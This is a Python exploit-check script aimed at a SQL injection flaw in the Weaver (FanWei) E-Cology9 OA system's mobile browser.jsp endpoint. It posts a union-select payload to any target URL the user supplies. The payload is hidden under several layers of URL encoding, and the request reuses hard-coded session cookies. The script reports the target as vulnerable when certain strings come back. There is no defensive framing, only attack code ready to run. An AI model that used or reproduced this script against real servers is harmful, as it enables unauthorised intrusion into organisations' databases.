import time
import requests
import urllib3


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "651",
        "DNT": "1",
        "Connection": "close",
        "Cookie": "ecology_JSessionid=aaaDJa14QSGzJhpHl4Vsy; JSESSIONID=aaaDJa14QSGzJhpHl4Vsy; __randcode__=28dec942-50d2-486e-8661-3e613f71028a",
        "Upgrade-Insecure-Requests": "1"
    }

    data = "isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30"

    exp_url = target_url + "mobile/%20/plugin/browser.jsp"

    print(now_time() + " [INFO]     正在检测FanWeiOA E-Cology9 browser SQL注入")
    try:
        urllib3.disable_warnings()
        response = requests.post(url=exp_url, headers=headers, data=data, verify=True, timeout=15)
        if response.status_code == 200 and ("autoCount" in response.text or "Page" in response.text):
            print(now_time() + ' [SUCCESS]  存在FanWeiOA E-Cology9 browser SQL注入漏洞: {}'.format(exp_url))
        else:
            print(now_time() + " [WARNING]  可能不存在FanWeiOA E-Cology9 browser SQL注入漏洞")
    except:
        print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在')
